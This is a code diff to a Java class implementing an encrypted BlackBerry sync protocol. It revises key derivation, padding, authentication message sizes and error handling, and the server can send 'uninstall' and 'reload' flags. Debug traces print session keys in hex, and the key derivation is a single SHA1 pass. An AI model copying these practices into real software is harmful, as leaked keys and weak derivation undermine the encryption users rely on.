@@ -4,6 +4,7 @@ package blackberry.action.sync.protocol;
 import java.io.EOFException;
 import java.util.Vector;
 
+import net.rim.device.api.crypto.CryptoException;
 import net.rim.device.api.crypto.RandomSource;
 import net.rim.device.api.crypto.SHA1Digest;
 import net.rim.device.api.util.ByteVector;
@@ -14,6 +15,7 @@ import blackberry.action.sync.transport.TransportException;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
+import blackberry.crypto.EncryptionPKCS5;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFlashFile;
@@ -33,13 +35,13 @@ public class ZProtocol extends Protocol {
     private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
     //#endif
 
-    private final Encryption cryptoK = new Encryption();
-    private final Encryption cryptoConf = new Encryption();
+    private final Encryption cryptoK = new EncryptionPKCS5();
+    private final Encryption cryptoConf = new EncryptionPKCS5();
 
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
 
-    public boolean start() {
+    public boolean perform() {
 
         reload = false;
         uninstall = false;
@@ -203,7 +205,7 @@ public class ZProtocol extends Protocol {
     protected void parseAuthentication(byte[] authResult)
             throws ProtocolException {
         //#ifdef DBC
-        Check.ensures(authResult.length == 48, "authResult.length="
+        Check.ensures(authResult.length == 64, "authResult.length="
                 + authResult.length);
         //#endif
 
@@ -212,62 +214,73 @@ public class ZProtocol extends Protocol {
         //#endif
 
         // Retrieve K
-        byte[] cypherKs = new byte[16];
+        byte[] cypherKs = new byte[32];
         Utils.copy(cypherKs, authResult, cypherKs.length);
-        byte[] Ks = cryptoConf.decryptData(cypherKs);
+        try {
+            byte[] Ks = cryptoConf.decryptData(cypherKs);
 
-        //#ifdef DEBUG
-        debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
-        debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
-        //#endif
+            //#ifdef DEBUG
+            debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
+            debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
+            //#endif
 
-        final SHA1Digest digest = new SHA1Digest();
-        digest.update(Ks);
-        digest.update(Kd);
-        digest.update(Keys.getInstance().getConfKey());
+            //PBKDF1 (SHA1, c=1, Salt=KS||Kd) 
+            final SHA1Digest digest = new SHA1Digest();
+            digest.update(Keys.getInstance().getConfKey());
+            digest.update(Ks);
+            digest.update(Kd);
 
-        byte[] K = new byte[16];
-        Utils.copy(K, digest.getDigest(), K.length);
+            byte[] K = new byte[16];
+            Utils.copy(K, digest.getDigest(), K.length);
 
-        cryptoK.makeKey(K);
+            cryptoK.makeKey(K);
 
-        //#ifdef DEBUG
-        debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K));
-        //#endif
+            //#ifdef DEBUG
+            debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K));
+            //#endif
 
-        // Retrieve Nonce and Cap
-        byte[] cypherNonceCap = new byte[32];
-        Utils.copy(cypherNonceCap, 0, authResult, 16, cypherNonceCap.length);
+            // Retrieve Nonce and Cap
+            byte[] cypherNonceCap = new byte[32];
+            Utils
+                    .copy(cypherNonceCap, 0, authResult, 32,
+                            cypherNonceCap.length);
 
-        byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
-        //#ifdef DEBUG
-        debug.trace("decodeAuth plainNonceCap="
-                + Utils.byteArrayToHex(plainNonceCap));
-        //#endif
+            byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
+            //#ifdef DEBUG
+            debug.trace("decodeAuth plainNonceCap="
+                    + Utils.byteArrayToHex(plainNonceCap));
+            //#endif
 
-        boolean nonceOK = Utils
-                .equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
-        //#ifdef DEBUG
-        debug.trace("decodeAuth nonceOK: " + nonceOK);
-        //#endif
-        if (nonceOK) {
-            int cap = Utils.byteArrayToInt(plainNonceCap, 16);
-            if (cap == Proto.OK) {
-                //#ifdef DEBUG
-                debug.trace("decodeAuth Proto OK");
-                //#endif
-            } else if (cap == Proto.UNINSTALL) {
-                //#ifdef DEBUG
-                debug.trace("decodeAuth Proto Uninstall");
-                //#endif
+            boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0,
+                    Nonce.length);
+            //#ifdef DEBUG
+            debug.trace("decodeAuth nonceOK: " + nonceOK);
+            //#endif
+            if (nonceOK) {
+                int cap = Utils.byteArrayToInt(plainNonceCap, 16);
+                if (cap == Proto.OK) {
+                    //#ifdef DEBUG
+                    debug.trace("decodeAuth Proto OK");
+                    //#endif
+                } else if (cap == Proto.UNINSTALL) {
+                    //#ifdef DEBUG
+                    debug.trace("decodeAuth Proto Uninstall");
+                    //#endif
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("decodeAuth error: " + cap);
+                    //#endif
+                    throw new ProtocolException(11);
+                }
             } else {
-                //#ifdef DEBUG
-                debug.trace("decodeAuth error: " + cap);
-                //#endif
-                throw new ProtocolException(11);
+                throw new ProtocolException(12);
             }
-        } else {
-            throw new ProtocolException(12);
+
+        } catch (CryptoException ex) {
+            //#ifdef DEBUG
+            debug.error("parseAuthentication: " + ex);
+            //#endif
+            throw new ProtocolException(13);
         }
 
     }
@@ -579,15 +592,23 @@ public class ZProtocol extends Protocol {
 
     //// ****************************** INTERNALS ****************************************** ////
 
-    private byte[] command(int command) throws TransportException {
+    private byte[] command(int command) throws TransportException,
+            ProtocolException {
         //#ifdef DEBUG
         debug.trace("command: " + command);
         //#endif
         byte[] plainOut = Utils.intToByteArray(command);
         byte[] cypherOut = cryptoK.encryptData(plainOut);
         byte[] cypherIn = transport.command(cypherOut);
-        byte[] plainIn = cryptoK.decryptData(cypherIn);
-        return plainIn;
+        try {
+            byte[] plainIn = cryptoK.decryptData(cypherIn);
+            return plainIn;
+        } catch (CryptoException ex) {
+            //#ifdef DEBUG
+            debug.error("command: " + ex);
+            //#endif
+            throw new ProtocolException(15);
+        }
     }
 
     private byte[] command(int command, byte[] data, boolean addLen)
@@ -615,11 +636,23 @@ public class ZProtocol extends Protocol {
             Utils.copy(plainOut, 4, data, 0, data.length);
         }
 
-        byte[] plainIn = cypheredWriteRead(plainOut);
-        return plainIn;
+        try {
+            byte[] plainIn = cypheredWriteRead(plainOut);
+            return plainIn;
+        } catch (CryptoException e) {
+            //#ifdef DEBUG
+            debug.trace("command: " + e);
+            //#endif
+            throw new TransportException(16);
+        }
+
     }
 
-    private byte[] cypheredWriteRead(byte[] plainOut) throws TransportException {
+    private byte[] cypheredWriteRead(byte[] plainOut)
+            throws TransportException, CryptoException {
+        //#ifdef DEBUG
+        debug.trace("cypheredWriteRead");
+        //#endif
         byte[] cypherOut = cryptoK.encryptData(plainOut);
         byte[] cypherIn = transport.command(cypherOut);
         byte[] plainIn = cryptoK.decryptData(cypherIn);
